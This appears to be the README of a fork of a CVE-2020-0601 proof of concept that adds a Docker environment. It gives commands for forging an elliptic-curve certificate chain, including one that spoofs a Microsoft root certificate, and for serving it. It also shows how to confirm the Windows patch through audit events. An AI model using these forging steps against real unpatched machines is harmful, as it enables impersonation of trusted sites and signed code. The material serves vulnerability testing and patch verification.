# CVE-2020-0601

I give full credit to https://github.com/kudelskisecurity/chainoffools. This fork just adds a Dockerfile which creates a pre-configured environment.

## 💿 Build Docker Image
```bash
docker build -t cve-2020-0601 .
```

## 🚢 Docker container

To run the container with a bash shell

```bash
docker run -it --rm -v $(pwd):/app -w /app cve-2020-0601 bash
```

## ⚒️ Forging certificate

To forge certificate using default settings

```bash
./gen-key.sh
```

This will create `cert.key` and `cert_chain.crt`

### 💁 Server

To use the certificates and keys you just created run the server 

```bash
python server.py
```
## 🧪 Testing CVE-2020-0601

After creating the key and certificate run the server as describes above.

### Patching
To test first patch Windows machine.

I have yet to confirm these are the right patches https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-0601.


### Test Patch
To test that the patch has been successfully installed run

```powershell
(get-winevent -listprovider Microsoft-Windows-Audit-CVE).events
```

```powershell
Id          : 1
Version     : 0
LogLink     : System.Diagnostics.Eventing.Reader.EventLogLink
Level       : System.Diagnostics.Eventing.Reader.EventLevel
Opcode      : System.Diagnostics.Eventing.Reader.EventOpcode
Task        : System.Diagnostics.Eventing.Reader.EventTask
Keywords    : {}
Template    : <template xmlns="http://schemas.microsoft.com/win/2004/08/events">
                <data name="CVEID" inType="win:UnicodeString" outType="xs:string"/>
                <data name="AdditionalDetails" inType="win:UnicodeString" outType="xs:string"/>
              </template>

Description : Possible detection of CVE: %1
              Additional Information: %2

              This Event is generated when an attempt to exploit a known vulnerability (%1) is detected.
              This Event is raised by a User mode process.


Id          : 2
Version     : 0
LogLink     : System.Diagnostics.Eventing.Reader.EventLogLink
Level       : System.Diagnostics.Eventing.Reader.EventLevel
Opcode      : System.Diagnostics.Eventing.Reader.EventOpcode
Task        : System.Diagnostics.Eventing.Reader.EventTask
Keywords    : {}
Template    : <template xmlns="http://schemas.microsoft.com/win/2004/08/events">
                <data name="CVEID" inType="win:UnicodeString" outType="xs:string"/>
                <data name="AdditionalDetails" inType="win:UnicodeString" outType="xs:string"/>
              </template>

Description : Possible detection of CVE: %1
              Additional Information: %2

              This Event is generated when an attempt to exploit a known vulnerability (%1) is detected.
              This Event is raised by a kernel mode driver.
```

### Event viewer

Open Event Viewer with

```powershell
eventvwr.exe
```

In `Windows Logs` folder double click on `Application`.

Run `client.py` this will open your browser to the proper URL

```powershell
pipenv run python client.py
```

You should see an event appear in Event Viewer that looks like the following

```xml
<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<Events>
    <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
        <System>
            <Provider Name="Microsoft-Windows-Audit-CVE" Guid="{85a62a0d-7e17-485f-9d4f-749a287193a6}" />
            <EventID>1</EventID>
            <Version>0</Version>
            <Level>3</Level>
            <Task>0</Task>
            <Opcode>0</Opcode>
            <Keywords>0x8000000000000000</Keywords>
            <TimeCreated SystemTime="2020-01-20T20:36:32.447818800Z" />
            <EventRecordID>8068</EventRecordID>
            <Correlation />
            <Execution ProcessID="2804" ThreadID="1824" />
            <Channel>Application</Channel>
            <Computer>DESKTOP-PQ0620D</Computer>
            <Security UserID="S-1-5-21-888255177-1018887469-42971076-1000" />
        </System>
        <EventData>
            <Data Name="CVEID">[CVE-2020-0601] cert validation</Data>
            <Data Name="AdditionalDetails">CA: &lt;USERTrust ECC Certification Authority&gt; sha1: C01B8463C8619676BA102EEBF0C30CDCED9A942B para: 06052B81040022 otherPara: 30820157020101303C06072A8648CE3D0101023100FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFFFF0000000000000000FFFFFFFF307B0430FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFFFF0000000000000000FFFFFFFC0430B3312FA7E23EE7E4988E056BE3F82D19181D9C6EFE8141120314088F5013875AC656398D8A2ED19D2A85C8EDD3EC2AEF031500A335926AA319A27A1D00896A6773A4827ACDAC73046104D6EB7932E25502AE5151A3609384C13041904BE25B912B77FE4333C0B1486FB0CD815522FF79F8E85A9045E8DFDA490E706BD2FC38276D0A998962A1DFA1E0361AE82AEFC24BDECD9BD856CDC2FDADB54DEEFF6ACDFC0B2BF5ABEBB21C5705D4023100FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFC7634D81F4372DDF581A0DB248B0A77AECEC196ACCC52973020101</Data>
        </EventData>
    </Event>
</Events>
```

## ☣️ Hazardou

Run the docker container with the preset environment

```bash
docker run -it --rm -v $(pwd):/app -w /app cve-2020-0601 bash
```

Run the gen_key.py CLI debug

```bash
pipenv run python gen_key.py -p tools/MicrosoftECCProductRootCertificateAuthority.cer -d
```

Running `pipenv run python gen_key.py --help`

```
Usage: gen_key.py [OPTIONS]

  Create forged key from EC certificate

Options:
  -p, --cert-path TEXT  Full path to EC certificate
  -o, --output TEXT     Full output path to write forged certificate to
  -k, --key-pem TEXT    Full output path to write key pem to
  -d, --debug           Debug does not write keys to dick
  --help                Show this message and exit.          Show this message and exit.
  ```